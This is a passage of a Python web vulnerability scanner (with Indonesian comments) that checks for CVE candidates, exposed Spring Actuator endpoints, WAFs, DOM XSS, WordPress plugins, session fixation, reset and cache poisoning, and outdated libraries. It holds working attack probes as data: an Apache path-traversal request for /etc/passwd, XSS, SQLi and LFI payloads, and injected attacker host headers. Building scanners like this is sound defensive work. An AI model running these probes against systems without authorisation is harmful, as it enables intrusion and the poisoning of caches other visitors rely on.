    ("Django", ">=3.1.0,<3.1.13", "CVE-2021-35042", "HIGH", 8.9,
     "Django in the CVE-2021-35042 range: SQL injection via unsanitized ordering input in QuerySet.order_by(). Preconditions NOT verifiable from the scanned URL: an endpoint must pass user input into order_by. Version range only — verify manually."),
    ("Django", ">=2.2.0,<2.2.24", "CVE-2021-35042", "HIGH", 8.9,
     "Django in the CVE-2021-35042 range: SQL injection via unsanitized ordering input in QuerySet.order_by(). Preconditions NOT verifiable from the scanned URL: an endpoint must pass user input into order_by. Version range only — verify manually."),
]

_NVD_TOKENS = {"WordPress": "wordpress", "Apache": "apache",
               "jQuery": "jquery", "PHP": "php", "nginx": "nginx",
               "OpenSSL": "openssl",
               "Tomcat": "tomcat", "Spring Boot": "spring boot",
               "Jetty": "jetty", "Node.js": "node.js",
               "Express (Node.js)": "express", "Next.js": "next.js",
               "Django": "django", "Laravel": "laravel",
               "Ruby on Rails": "rails", "Drupal": "drupal",
               "GeneXus": "genexus"}


def _spec_match(ver, spec):
    """True bila versi `ver` memenuhi spec rentang (CSV klausul). Versi yang
    tidak terparse -> False (tidak pernah menebak)."""
    try:
        from packaging.version import Version
        v = Version(str(ver))
    except Exception:
        return False
    for clause in (spec or "").split(","):
        clause = clause.strip()
        m = re.match(r"(==|<=|>=|<|>)\s*(.+)$", clause)
        if not m:
            return False
        op, raw = m.group(1), m.group(2).strip()
        try:
            rv = Version(raw)
        except Exception:
            return False
        if op == "==" and not v == rv:
            return False
        if op == "<" and not v < rv:
            return False
        if op == "<=" and not v <= rv:
            return False
        if op == ">" and not v > rv:
            return False
        if op == ">=" and not v >= rv:
            return False
    return True


def _attach_cves(ctx, techs):
    """Tempelkan kandidat CVE ke setiap entri tech_profile: dari tabel
    internal (exact + rentang) dan dari cache NVD lokal (kata kunci produk
    + versi disebut / frasa 'prior to' di deskripsi). Mengembalikan list
    (tech, cve_dict, desc) untuk temuan bawaan tabel internal."""
    builtin_hits = []
    for t in techs:
        cves, seen = [], set()
        ver = t.get("version") or ""
        if ver:
            for name, ever, cve, sev, cvss, desc in CVE_CANDIDATES:
                if desc and t["name"] == name and ver == ever:
                    cves.append({"id": cve, "cvss": cvss, "severity": sev,
                                 "source": "builtin"})
                    seen.add(cve)
                    builtin_hits.append((t, cves[-1], desc))
            for name, spec, cve, sev, cvss, desc in CVE_RANGES:
                if t["name"] == name and _spec_match(ver, spec) \
                        and cve not in seen:
                    cves.append({"id": cve, "cvss": cvss, "severity": sev,
                                 "source": "builtin-range"})
                    seen.add(cve)
                    builtin_hits.append((t, cves[-1], desc))
            token = _NVD_TOKENS.get(t["name"])
            if token:
                try:
                    import store as _store
                    for row in _store.cve_search(token, 50):
                        cid = row.get("cve_id") or ""
                        if not cid or cid in seen:
                            continue
                        desc_c = row.get("description") or ""
                        keep = ver in desc_c
                        if not keep:
                            for mfix in re.finditer(
                                    r"prior to (?:version )?v?([\d.]+)",
                                    desc_c):
                                if _spec_match(ver, "<" + mfix.group(1)):
                                    keep = True
                                    break
                        if keep:
                            cves.append({"id": cid, "cvss": row.get("cvss"),
                                         "severity": row.get("severity"),
                                         "source": "nvd-cache"})
                            seen.add(cid)
                        if len(cves) >= 6:
                            break
                except Exception:
                    pass
        t["cves"] = cves
    return builtin_hits


def c_cve_candidates(ctx, add):
    techs = _tech_fingerprint(ctx)
    for t, cve, desc in _attach_cves(ctx, techs):
        add(F(cve["severity"], f"Candidate {cve['id']}: {t['name']} {t['version']}",
              desc + ' Status: CANDIDATE based on fingerprinted version — manual verification / patch-level check is mandatory before reporting as valid.',
              evidence=t["evidence"], cwe="CWE-1035",
              owasp="A06:2021 Vulnerable & Outdated Components",
              cvss=cve["cvss"] or 0.0,
              remed=f"Upgrade {t['name']} to a version that patches {cve['id']}.",
              confidence="candidate", location="/"))
    for t in techs:
        cache_hits = [c for c in (t.get("cves") or [])
                      if c["source"] == "nvd-cache"]
        if cache_hits:
            ids = ", ".join(c["id"] for c in cache_hits[:6])
            add(F("INFO", f"NVD cache: {len(cache_hits)} CVE candidate(s) match {t['name']} {t.get('version', '')}".rstrip(),
                  f"The local NVD cache (synced CVE data) contains entries whose descriptions match the fingerprinted version of {t['name']}: {ids}. Status: CANDIDATE — confirm applicability per CVE before reporting.",
                  evidence=t["evidence"], cwe="CWE-1035",
                  owasp="A06:2021 Vulnerable & Outdated Components", cvss=0.0,
                  remed=f"Review each listed CVE for {t['name']} and upgrade/patch as applicable.",
                  confidence="candidate", location="/"))
    # Spring actuator ter-expose (signature nyata, bukan sekadar 200)
    r = ctx.client.get("/actuator")
    if r.status == 200 and not ctx.is_missing(r) and "_links" in (r.body or ""):
        add(F("HIGH", 'Spring Boot Actuator exposed: /actuator',
              'The response contains actuator _links (Spring signature) without authentication.',
              evidence=r.body[:140], cwe="CWE-200", owasp="A05:2021", cvss=7.5,
              remed='Secure the actuator with Spring Security; expose only health/info.',
              confidence="confirmed", location="/actuator"))
        # WS5 (v1.10.0, K1): /actuator/info di-parse OPOR TUNISTIK —
        # hanya di sini, hanya karena /actuator SUDAH terkonfirmasi
        # terbuka pada target yang sama (bukan probe standar baru).
        # Versi yang ditemukan adalah versi BUILD APLIKASI (metadata
        # build milik aplikasi), BUKAN versi framework Spring Boot —
        # dilabeli persis seperti itu dan tidak dipakai untuk CVE.
        try:
            ir = ctx.client.get("/actuator/info")
            if ir.status == 200 and not ctx.is_missing(ir):
                info = json.loads(ir.body or "")
                if isinstance(info, dict) and any(
                        k in info for k in ("build", "git", "app")):
                    bld = info.get("build") or {}
                    appd = info.get("app") or {}
                    gitd = info.get("git") or {}
                    bv = bld.get("version") or appd.get("version")
                    commit = ((gitd.get("commit") or {}).get("id")
                              if isinstance(gitd.get("commit"), dict)
                              else gitd.get("commit"))
                    if bv:
                        add(F("INFO",
                              "Spring Boot application build version "
                              f"via /actuator/info: {bv}",
                              "The exposed /actuator/info endpoint "
                              "publishes the application's own build "
                              "metadata. This is the APPLICATION build "
                              "version — it is NOT a Spring Boot or "
                              "framework version and must not be used "
                              "for framework CVE matching.",
                              evidence=(f"build.version={bv}"
                                        + (f"; git commit {commit}"
                                           if commit else "")),
                              cwe="CWE-215", owasp="A05:2021",
                              cvss=0.0,
                              remed='Restrict /actuator/info like the '
                                    'other actuator endpoints.',
                              confidence="confirmed",
                              location="/actuator/info"))
                        for t in techs:
                            if t["name"] == "Spring Boot":
                                t["app_build_version"] = str(bv)
                                break
        except Exception:
            pass
    for path, sev, title, remed in [
            ("/phpmyadmin/", "MEDIUM", 'phpMyAdmin exposed',
             'Restrict via IP/VPN or remove from production.'),
            ("/administrator/", "MEDIUM", 'Joomla admin exposed',
             'Restrict access; patch regularly.')]:
        r = ctx.client.get(path)
        if r.status == 200 and not ctx.is_missing(r) and re.search(
                r"phpmyadmin|joomla|login", r.body or "", re.I):
            add(F(sev, f"{title}: {path}",
                  'The console is publicly reachable and its content passed the product signature check.',
                  evidence=f"HTTP 200 + signature", cwe="CWE-1188", owasp="A05:2021",
                  cvss=5.3, remed=remed, confidence="probable", location=path))
    # Apache CVE-2021-41773 — probe AKTIF terkonfirmasi (bukan kandidat lagi bila lolos)
    techs_apache = [t for t in techs if t["name"] == "Apache" and t["version"] in ("2.4.49", "2.4.50")]
    if techs_apache:
        probe = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        r = ctx.client.get(probe)
        if r.status == 200 and re.search(r"root:.*?:0:0:", r.body or ""):
            add(F("CRITICAL", 'CVE-2021-41773 CONFIRMED: Apache path traversal',
                  'A traversal probe read /etc/passwd from the vulnerable Apache target.',
                  evidence='signature /etc/passwd from the .%2e probe', cwe="CWE-22",
                  owasp="A01:2021", cvss=9.8,
                  remed='Upgrade Apache to >=2.4.51 IMMEDIATELY.',
                  confidence="confirmed", location=probe))


# ------------------------------------------------------------ advanced checks (v3.2)

# Signature WAF (v3.4.1): indikator KUAT saja, header dan body dipisah.
# Insiden FP 2026-10-16: pola lama r"f5" cocok dengan substring "f5" di dalam
# token hex acak aplikasi GeneXus (gx_ajax_key) pada server nginx polos ->
# tuduhan "F5 BIG-IP" palsu. Aturan di sini: pola 1-2 karakter dan nama vendor
# telanjang di body DILARANG; setiap pola harus khas vendor, dan bukti yang
# cocok (header/snippet) dicatat di evidence agar FP berikutnya mudah dilacak.
# WS3 (v1.4.0): signature tables formalized into SCORED DATA RULES in
# wafscore.py — {scope, anchored pattern, vendor, score, label},
# max-merge per vendor, +0.05 blocking-status boost (cap 1.0), display
# floor 0.3. Vendor names in ordinary body text score 0.25 by
# construction, so the F5 incident class (naming a vendor from a bare
# substring/name mention) cannot recur; score + constituent signals
# are mandatory parts of the finding evidence.
def _waf_match(headers, body, status=None):
    """Backward-compatible scored match: (vendor, evidence) for the
    best vendor at/above the display floor, else None. Pure function."""
    return wafscore.match(headers, body, status=status)


WAF_BLOCK_STATUSES = {403, 406, 409, 411, 419, 451, 501, 999}
WAF_BLOCK_WORDS = ("blocked", "access denied", "request rejected",
                   "security policy", "web application firewall",
                   "attention required", "mod_security", "request blocked")


def _waf_behavior_verdict(probes):
    """Klasifikasi perilaku WAF dari hasil probe. probes: list dict
    {kind: 'attack'|'control', status: int, body: str}.
    WAF dinyatakan TERKONFIRMASI hanya bila >=2 kelas serangan diblokir DAN
    tidak ada kontrol jinak yang diblokir — bukti perilaku, bukan tebakan
    signature. Fungsi murni, unit-testable."""
    def blocked(p):
        if p.get("status") in WAF_BLOCK_STATUSES:
            return True
        b = (p.get("body") or "").lower()
        return p.get("status") not in (200, 404, 405) and \
            any(w in b for w in WAF_BLOCK_WORDS)
    atk = [p for p in probes if p["kind"] == "attack"]
    ctl = [p for p in probes if p["kind"] == "control"]
    n_atk = sum(1 for p in atk if blocked(p))
    n_ctl = sum(1 for p in ctl if blocked(p))
    return {"blocked_attacks": n_atk, "total_attacks": len(atk),
            "blocked_controls": n_ctl, "total_controls": len(ctl),
            "confirmed": n_atk >= 2 and n_ctl == 0}


def c_waf_detection(ctx, add):
    """Deteksi WAF berbasis PERILAKU (v3.5) + fingerprint BERSKOR (WS3):
    kirim payload serangan (XSS/SQLi/LFI) dan kontrol jinak ke path yang PASTI
    tidak ada di aplikasi. Aplikasi tidak punya apa pun untuk diblokir di path
    hantu itu, jadi blocking diferensial (serangan diblokir, kontrol lolos)
    membuktikan ada lapisan inspeksi di depan aplikasi. Nama vendor hanya
    disebut bila skor fingerprint-nya (aturan data wafscore, max-merge,
    lantai tampil 0.3) mencukupi, dan skor + sinyal penyusunnya WAJIB masuk
    evidence. Bila perilaku memblokir terbukti tanpa sinyal vendor apa pun,
    hasilnya 'Unknown WAF' (skor provokasi 0.40) — dengan dua pengecualian:
    blokir yang hanya 429 + Retry-After (itu rate limiting) dan status yang
    sama dengan baseline kontrol (itu perilaku aplikasi, bukan WAF)."""
    home = ctx.client.get("/")
    mk = ctx.marker
    ghost = f"/ptk-ghost-{mk}"
    probes_spec = [
        ("attack", f"{ghost}?q=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"),
        ("attack", f"{ghost}?id=1%27%20OR%20%271%27%3D%271"),
        ("attack", f"{ghost}/..%2f..%2fetc%2fpasswd"),
        ("control", f"{ghost}?q=" + "a" * 180),
        ("control", f"{ghost}?q=%E2%9C%93%20halo%20dunia"),
        ("control", f"{ghost}?q=%22%27%3B%3D%28%29"),
    ]
    probes = []
    for kind, path in probes_spec:
        r = ctx.client.get(path)
        probes.append({"kind": kind, "status": r.status or 0,
                       "body": (r.body or "")[:1500],
                       "headers": list(r.headers),
                       "retry_after": bool(r.hdr("retry-after"))})
    v = _waf_behavior_verdict(probes)
    stat_txt = ", ".join(f"{p['kind']}:{p['status']}" for p in probes)
    # Scored fingerprint: home response MERGED (max) with every blocked
    # attack response — block pages themselves often carry the vendor.
    scored = wafscore.score_waf(list(home.headers), home.body or "",
                                status=home.status)
    for p in probes:
        if p["kind"] == "attack" and p["status"] in wafscore.BLOCK_STATUSES:
            scored = wafscore.merge_scored(
                scored, wafscore.score_waf(p["headers"], p["body"],
                                           status=p["status"]))
    vendor = wafscore.best_vendor(scored)
    ctx.L(f"  [waf] behavior: {v['blocked_attacks']}/{v['total_attacks']} attacks blocked, controls blocked {v['blocked_controls']}; vendor: "
          + (f"{vendor['vendor']} score {vendor['score']:.2f}" if vendor else "-"))
    note = ("Scan results may be suppressed (payloads blocked) — negative findings on this target must be read as 'not confirmed', not 'clean'.")
    if v["confirmed"]:
        title = 'WAF confirmed (measured blocking behavior)'
        ev = f"probe path-hantu: {stat_txt}"
        if vendor:
            title += f" \u2014 vendor indication: {vendor['vendor']}"
            ev += f"; {wafscore.evidence_str(vendor)}"
        add(F("INFO", title,
              'The inspection layer in front of the application PROVABLY blocks attack payloads on paths that do not exist in the application, while benign control requests pass. ' + note,
              evidence=ev, cwe="CWE-693", owasp="A05:2021", cvss=0.0,
              remed='No action required — scan accuracy context information.',
              confidence="confirmed", location="/"))
    elif vendor:
        add(F("INFO", f"WAF indication: {vendor['vendor']} (behavior not yet confirmed)",
              'A vendor fingerprint scored at/above the display floor, but the blocking behavior test does not prove active inspection — treat it as an indication, not a certainty. ' + note,
              evidence=f"{wafscore.evidence_str(vendor)}; probe: {stat_txt}", cwe="CWE-693",
              owasp="A05:2021", cvss=0.0,
              remed='No action required — scan accuracy context information.',
              confidence="probable", location="/"))
    else:
        # Provocation path: blocking behavior without any vendor signal.
        ctl_statuses = {p["status"] for p in probes if p["kind"] == "control"}
        blocked_atk = [p for p in probes if p["kind"] == "attack"
                       and p["status"] in wafscore.BLOCK_STATUSES
                       and p["status"] not in ctl_statuses]
        hard_blocked = [p for p in blocked_atk
                        if not (p["status"] == 429 and p["retry_after"])]
        if hard_blocked:
            sts = ", ".join(sorted({str(p["status"]) for p in hard_blocked}))
            add(F("INFO", "Unknown WAF (blocking behavior, no vendor signature)",
                  'Attack probes were blocked on non-existent paths while benign controls were not, but no vendor fingerprint scored above the display floor — the inspection layer is reported as an UNKNOWN WAF rather than guessed. ' + note,
                  evidence=f"provocation score {wafscore.UNKNOWN_WAF_SCORE:.2f}; blocked attack statuses: {sts}; controls: {sorted(ctl_statuses)}; probe: {stat_txt}",
                  cwe="CWE-693", owasp="A05:2021", cvss=0.0,
                  remed='No action required — scan accuracy context information.',
                  confidence="probable", location="/"))


DOM_SOURCES = [r"location\.(search|hash|href)", r"document\.(URL|documentURI|referrer)",
               r"window\.name", r"URLSearchParams"]
DOM_SINKS = [r"\.innerHTML\s*=", r"\.outerHTML\s*=", r"document\.write(?:ln)?\s*\(",
             r"eval\s*\(", r"\.insertAdjacentHTML\s*\(", r"setTimeout\s*\(\s*['\"]",
             r"\$\s*\([^)]*\)\.html\s*\("]


def c_dom_xss(ctx, add):
    """DOM XSS statis: file JS same-host yang memuat SOURCE (location.search/hash/dll)
    DAN SINK berbahaya (innerHTML/document.write/eval) dalam file yang sama = probable.
    WS2 v1.4.0: blok <script> INLINE kini juga dianalisis, diekstrak dari
    DOM TER-PARSE (lxml — bukan regex di atas HTML mentah); tetap probable,
    karena analisis statis tidak membuktikan aliran data — jalur konfirmasi
    DOM XSS adalah eksekusi headless."""
    surf = ctx.surface(full=True)
    home = surf.homepage or ctx.client.get("/")
    srcs = [s for s in re.findall(r'''<script[^>]+src\s*=\s*["']([^"']+)["']''',
                                  home.body or "", re.I) if s.startswith("/")]
    for src in list(dict.fromkeys(srcs))[:6]:
        r = ctx.client.get(src)
        if r.status != 200 or not r.body:
            continue
        srcs_hit = [p for p in DOM_SOURCES if re.search(p, r.body)]
        sinks_hit = [p for p in DOM_SINKS if re.search(p, r.body)]
        if srcs_hit and sinks_hit:
            add(F("HIGH", f"DOM-based XSS indication in JS file: {src}",
                  f"This JavaScript file reads user-controlled input ({srcs_hit[0]}) and writes to a dangerous sink ({sinks_hit[0]}) — a classic DOM XSS combination. Static analysis does not prove the data flow is connected; manual verification in a browser is still required.",
                  evidence=f"source={srcs_hit[0]} sink={sinks_hit[0]}", cwe="CWE-79",
                  owasp="A03:2021 Injection", cvss=7.4,
                  remed='Use textContent, not innerHTML/document.write, for data from URLs; sanitize with DOMPurify.',
                  confidence="probable", location=src))
    # ---- inline <script> blocks, extracted from the PARSED DOM
    seen_pages = []
    for pg in ["/"] + list(surf.pages or [])[:5]:
        pth = pg.split("?")[0]
        if pth in seen_pages:
            continue
        seen_pages.append(pth)
        try:
            r = ctx.client.get(pth)
        except Exception:
            continue
        if r.status != 200 or not r.body:
            continue
        root = xssverify._parse(r.body)
        if root is None:
            continue
        for el in xssverify._iter_elements(root):
            if xssverify._tag(el) != "script":
                continue
            if (xssverify._attrs(el).get("src") or "").strip():
                continue  # external file — covered by the loop above
            code = xssverify._text(el)
            if not code or len(code) < 20:
                continue
            srcs_hit = [p for p in DOM_SOURCES if re.search(p, code)]
            sinks_hit = [p for p in DOM_SINKS if re.search(p, code)]
            if srcs_hit and sinks_hit:
                add(F("HIGH", f"DOM-based XSS indication in inline script: {pth}",
                      f"An inline <script> block on this page (extracted from the parsed DOM) reads user-controlled input ({srcs_hit[0]}) and writes to a dangerous sink ({sinks_hit[0]}) — a classic DOM XSS combination. Static analysis does not prove the data flow is connected; manual verification in a browser is still required.",
                      evidence=f"inline script: source={srcs_hit[0]} sink={sinks_hit[0]}", cwe="CWE-79",
                      owasp="A03:2021 Injection", cvss=7.4,
                      remed='Use textContent, not innerHTML/document.write, for data from URLs; sanitize with DOMPurify.',
                      confidence="probable", location=pth))
                break


WP_PLUGINS = {
    "wp-file-manager": ("6.9", "CVE-2020-25213 RCE via upload (versi <6.9)"),
    "elementor": ("3.18.2", 'several XSS/upload CVEs in old versions'),
    "revslider": ("4.2", 'CVE-2014-9734 classic LFI/upload'),
    "contact-form-7": ("5.1.8", "CVE-2020-12800 unrestricted upload (versi <5.1.9)"),
    "woocommerce": ("5.0.0", 'old version range with privilege/XSS CVEs'),
    "duplicator": ("1.3.28", "CVE-2020-11738 LFI (versi <1.3.28)"),
    "wp-statistics": ("13.0.8", "CVE-2021-24340 SQLi (versi <13.0.8)"),
}


def _ver_lt(a, b):
    try:
        pa = [int(x) for x in re.findall(r"\d+", a)][:3]
        pb = [int(x) for x in re.findall(r"\d+", b)][:3]
        return (pa + [0, 0, 0])[:3] < (pb + [0, 0, 0])[:3]
    except Exception:
        return False


def c_wp_plugins(ctx, add):
    """Enumerasi plugin WordPress populer via readme.txt (Stable tag) -> kandidat CVE."""
    if not any(t["name"] == "WordPress" for t in _tech_fingerprint(ctx)):
        return
    for slug, (vuln_below, note) in WP_PLUGINS.items():
        if ctx.cancelled():
            return
        path = f"/wp-content/plugins/{slug}/readme.txt"
        r = ctx.client.get(path)
        if r.status != 200 or ctx.is_missing(r) or not r.body:
            continue
        m = re.search(r"Stable tag:\s*([\d.]+)", r.body)
        if not m:
            continue
        ver = m.group(1)
        old = _ver_lt(ver, vuln_below)
        add(F("HIGH" if old else "INFO",
              f"WordPress plugin detected: {slug} {ver}",
              f"The plugin readme.txt is publicly readable. " +
              (f"Versi {ver} below {vuln_below}: {note}." if old else
               'This version is not below the known CVE threshold in the built-in database.'),
              evidence=f"Stable tag: {ver}", cwe="CWE-1035",
              owasp="A06:2021 Vulnerable & Outdated Components",
              cvss=7.5 if old else 0.0,
              remed='Update the plugin; hide readme.txt via server rules.',
              confidence="candidate" if old else "confirmed", location=path))


def c_source_disclosure(ctx, add):
    """Backup file per halaman hasil crawl: <page>.bak/.old/.save/.swp/~ yang memuat
    signature kode sumber (bukan HTML hasil render)."""
    surf = ctx.surface(full=True)
    pages = [p.split("?")[0] for p in surf.pages if "." in p.split("/")[-1]][:5]
    sig = re.compile(r"<\?php|import\s+\w+\s+from|require\(|function\s+\w+\s*\(|#include|package\s+[\w.]+;|using\s+System")
    for page in pages:
        for suffix in [".bak", ".old", ".save", "~", ".swp"]:
            r = ctx.client.get(page + suffix)
            if r.status == 200 and r.body and not ctx.is_missing(r) and sig.search(r.body) \
                    and "<html" not in r.body[:300].lower():
                add(F("HIGH", f"Page backup/source exposed: {page}{suffix}",
                      'The page backup copy contains source code (signature detected) — leaking logic, comments, and potentially hardcoded credentials.',
                      evidence=r.body[:100].replace("\n", " "), cwe="CWE-540",
                      owasp="A05:2021", cvss=7.5,
                      remed='Remove backup files from the webroot; block .bak/.old/.swp extensions at the server.',
                      confidence="confirmed", location=page + suffix))
                return


def _session_cookie(resp):
    for raw in resp.hdr_all("set-cookie"):
        name = raw.split("=", 1)[0].strip().lower()
        if any(k in name for k in ("session", "sess", "sid", "auth", "token")):
            return raw.split(";")[0]
    return ""


def c_session_fixation(ctx, add):
    """Session fixation: nilai cookie sesi yang ditetapkan SEBELUM login harus BERUBAH
    setelah login berhasil. Bila tetap sama -> probable fixation."""
    surf = ctx.surface(full=True)
    for form in surf.forms:
        if form["method"] != "POST":
            continue
        names = [i.lower() for i in form["inputs"]]
        if not any("pass" in n for n in names):
            continue
        page = ctx.client.get(form["page"])
        pre = _session_cookie(page)
        if not pre:
            continue
        uname = next((i for i in form["inputs"] if "user" in i.lower() or "email" in i.lower()),
                     form["inputs"][0] if form["inputs"] else "username")
        pw = next((i for i in form["inputs"] if "pass" in i.lower()), "password")
        resp = ctx.client.post(form["action"],
                               data=f"{uname}=ptk-fixation-probe&{pw}=ptk-probe-{ctx.marker}",
                               headers={"Cookie": pre})
        post = _session_cookie(resp)
        if resp.status in (200, 301, 302, 303, 307) and (not post or post == pre):
            add(F("MEDIUM", f"Session fixation indication: {form['action']}",
                  f"Session cookie before login ({pre.split('=')[0]}=…) is not rotated after the login POST — the application accepts a session ID set before authentication (fixation pattern). The probe uses random credentials; if the application rotates only on SUCCESSFUL login, verify manually with a test account.",
                  evidence='identical session cookie before/after the login POST', cwe="CWE-384",
                  owasp="A07:2021", cvss=6.5,
                  remed='Regenerate the session ID whenever the authentication level changes.',
                  confidence="probable", location=form["action"]))
            return


def c_password_reset_poisoning(ctx, add):
    """Password-reset poisoning: endpoint lupa password yang membangun tautan reset
    dari X-Forwarded-Host terkontrol attacker."""
    evil = f"evil-{ctx.marker}.example.com"
    surf = ctx.surface(full=True)
    cands = [p.split("?")[0] for p in surf.pages
             if any(k in p.lower() for k in ("forgot", "reset", "recover"))]
    for guess in ["/forgot", "/forgot-password", "/reset-password", "/account/forgot"]:
        if guess not in cands:
            r = ctx.client.get(guess)
            if r.status and not ctx.is_missing(r):
                cands.append(guess)
    for path in list(dict.fromkeys(cands))[:3]:
        r = ctx.client.post(path, data="email=victim%40example.com",
                            headers={"X-Forwarded-Host": evil})
        if evil in (r.body or ""):
            add(F("HIGH", f"Password Reset Poisoning: {path}",
                  "The forgot-password flow response contains the host from X-Forwarded-Host — the reset link sent to the victim can point to the attacker's domain.",
                  evidence=f"host {evil} reflected in the reset response", cwe="CWE-640",
                  owasp="A07:2021", cvss=7.4,
                  remed="Build reset links from the server configuration's canonical host, not request headers.",
                  confidence="probable", location=path))
            return
        rg = ctx.client.get(path, headers={"X-Forwarded-Host": evil})
        if evil in (rg.body or ""):
            add(F("MEDIUM", f"Host header reflected on the reset page: {path}",
                  'The reset page reflects X-Forwarded-Host — check the reset email link generation flow (password reset poisoning indication).',
                  evidence=evil, cwe="CWE-640", owasp="A07:2021", cvss=5.9,
                  remed='Use the canonical host for all outbound links.',
                  confidence="probable", location=path))
            return


def c_cache_poisoning(ctx, add):
    """Web cache poisoning: nilai X-Forwarded-Host yang tersimpan harus muncul di
    request NORMAL berikutnya (tanpa header itu) — urutan: baseline, racun, verifikasi."""
    surf = ctx.surface(full=True)
    pages = list(dict.fromkeys(p.split("?")[0] for p in surf.pages
                               if p.startswith("/")))[:10] or ["/"]
    evil = f"evil-{ctx.marker}.example.com"
    for path in pages:
        first = ctx.client.get(path)
        if evil in (first.body or ""):
            continue
        ctx.client.get(path, headers={"X-Forwarded-Host": evil,
                                        "X-Forwarded-Scheme": "http"})
        verify = ctx.client.get(path)
        if evil in (verify.body or ""):
            add(F("HIGH", f"Web Cache Poisoning confirmed: {path}",
                  'The unverified header value (X-Forwarded-Host) sent by the scan reappears in the next normal request — the response is stored in the shared cache and will be served to other visitors.',
                  evidence=f"{evil} persisted in cache for {path}", cwe="CWE-349",
                  owasp="A05:2021", cvss=7.4,
                  remed='Include response-affecting headers in the cache key (Vary) or ignore X-Forwarded-* from direct clients.',
                  confidence="confirmed", location=path))
            return


# ------------------------------------------------------------ enterprise checks (v3.1)

STACK_SIGNS = ["traceback (most recent call last)", "java.lang.", "javax.servlet",
               "stack trace", "org.springframework", "whoops, looks like something went wrong",
               "laravel\\", "asp.net", "system.web.http", "django version", "werkzeug",
               "valueerror", "typeerror:", "nullreferenceexception", "fatal error:",
               "on line ", "in <module>", "com.sun.", "node_modules", "at function."]


def c_error_disclosure(ctx, add):
    """Error verbose: picu error di parameter & nilai baseline; signature stack trace
    yang TIDAK ada di respons normal = disclosure."""
    for base, pname, method, orig in ctx.param_targets(limit=14):
        base_r = ctx.req_param(base, pname, "1", method, orig)
        r = ctx.req_param(base, pname, "\x00ptk-error-probe", method, orig)
        low, blow = (r.body or "").lower(), (base_r.body or "").lower()
        hits = [s for s in STACK_SIGNS if s in low and s not in blow]
        if hits:
            add(F("MEDIUM", f"Verbose error / stack trace exposed: {base} param '{pname}'",
                  f"Malformed input triggered an error page containing an internal stack trace ({hits[0]}…) — helps an attacker map the framework and server paths.",
                  evidence=f"signature: {hits[0]}", cwe="CWE-209",
                  owasp="A05:2021 Security Misconfiguration", cvss=5.3,
                  remed='Disable debug mode in production; show a generic error page; log details only server-side.',
                  confidence="probable", location=base, param=pname))
            return


JS_LIB_CVES = [
    (r"jquery[-@/]?(\d+\.\d+\.\d+)", "jQuery", {
        "1.11.1": 'CVE-2015-9251 (XSS via cross-domain AJAX)', "1.12.4": 'several old XSS/DOM CVEs',
        "2.2.4": "CVE-2019-11358 (prototype pollution)", "3.4.1": "CVE-2020-11022/11023 (XSS via htmlPrefilter)"}),
    (r"bootstrap[-@/]?(\d+\.\d+\.\d+)", "Bootstrap", {
        "3.3.7": "CVE-2019-8331 (XSS tooltip/popover)", "4.3.1": "CVE-2019-8331 (XSS tooltip/popover)"}),
    (r"angular(?:\.min)?\.js|angular[-@/](\d+\.\d+\.\d+)", "AngularJS", {
        "1.7.9": "AngularJS EOL — CVE sandbox escape beragam", "1.5.11": 'AngularJS EOL — upgrade required'}),
    (r"lodash[-@/]?(\d+\.\d+\.\d+)", "Lodash", {
        "4.17.15": "CVE-2020-8203 (prototype pollution)", "4.17.20": "CVE-2021-23337 (command injection via template)"}),
]


def c_js_libraries(ctx, add):
    """Library JS usang (kandidat CVE berbasis versi) + source map ter-expose."""
    surf = ctx.surface(full=True)
    home = surf.homepage or ctx.client.get("/")
    srcs = re.findall(r'''<script[^>]+src\s*=\s*["']([^"']+)["']''', home.body or "", re.I)
    seen = set()
    for src in srcs:
        low = src.lower()
        for pat, lib, table in JS_LIB_CVES:
            m = re.search(pat, low)
            if m and lib not in seen:
                seen.add(lib)
                ver = m.group(1) if m.groups() else ""
                note = table.get(ver, "old version — check this library's CVEs")
                # Perbandingan versi presisi (packaging, PEP 440) menggantikan
                # potong-string manual: versi terdeteksi <= versi rentan
                # tertinggi yang dikenal di tabel -> kandidat usang.
                try:
                    from packaging.version import Version as _PV
                    _in_range = bool(table) and _PV(ver) <= max(_PV(v) for v in table)
                except Exception:
                    _in_range = False
                if ver and (ver in table or _in_range or
                            (int(ver.split(".")[0]) <= 2 and lib == "jQuery")):
                    add(F("MEDIUM", f"Outdated JS library: {lib} {ver}",
                          f"{lib} {ver} detected from the script file name. Version note: {note}. Candidate status based on file version — verify that this is really the version being served.",
                          evidence=src[:120], cwe="CWE-1035",
                          owasp="A06:2021 Vulnerable & Outdated Components", cvss=5.4,
                          remed=f"Upgrade {lib} to the latest supported version.",
                          confidence="candidate", location=src[:120]))
        # source map untuk script same-host
        if src.startswith("/") and src.endswith(".js"):
            r = ctx.client.get(src + ".map")
            if r.status == 200 and not ctx.is_missing(r) and (
                    '"sourcesContent"' in (r.body or "") or '"mappings"' in (r.body or "")):
                add(F("HIGH", f"JavaScript source map exposed: {src}.map",
                      "The source map contains the application's original source code (sourcesContent) — an attacker obtains the complete frontend source code including endpoints and logic.",
                      evidence="signature source map valid", cwe="CWE-200",
                      owasp="A05:2021", cvss=7.5,
                      remed='Do not deploy .map files to production, or restrict access to them.',
                      confidence="confirmed", location=src + ".map"))


def c_sri_and_session(ctx, add):
    """SRI hilang untuk script eksternal, token session di URL, mixed content."""
    surf = ctx.surface(full=False)
    home = surf.homepage or ctx.client.get("/")
    body = home.body or ""
    for tag in re.findall(r"<script[^>]+>", body, re.I):
        m = re.search(r'''src\s*=\s*["'](https?://[^"']+)["']''', tag, re.I)
        if m and urlparse(m.group(1)).hostname not in (None, ctx.client.host):
            if "integrity=" not in tag:
                add(F("LOW", 'External script without Subresource Integrity (SRI)',
                      'A cross-origin script is loaded without an integrity attribute — if the CDN is compromised, malicious code runs on this page undetected.',
                      evidence=m.group(1)[:120], cwe="CWE-353",
                      owasp="A08:2021 Software & Data Integrity Failures", cvss=3.1,
                      remed='Add integrity="sha384-..." + crossorigin to external scripts.',
                      confidence="confirmed", location="/"))
                break
    if ctx.client.scheme == "https":
        mixed = re.findall(r'''(?:src|href)\s*=\s*["'](http://[^"']+)["']''', body, re.I)
        if mixed:
            add(F("MEDIUM", f"Mixed content: {len(mixed)} HTTP resource on an HTTPS page",
                  'Active/passive resources are loaded over plain HTTP on an HTTPS page — can be modified by a MITM.',
                  evidence=mixed[0][:120], cwe="CWE-319", owasp="A02:2021", cvss=5.3,
                  remed='Load all resources over HTTPS.', confidence="confirmed", location="/"))
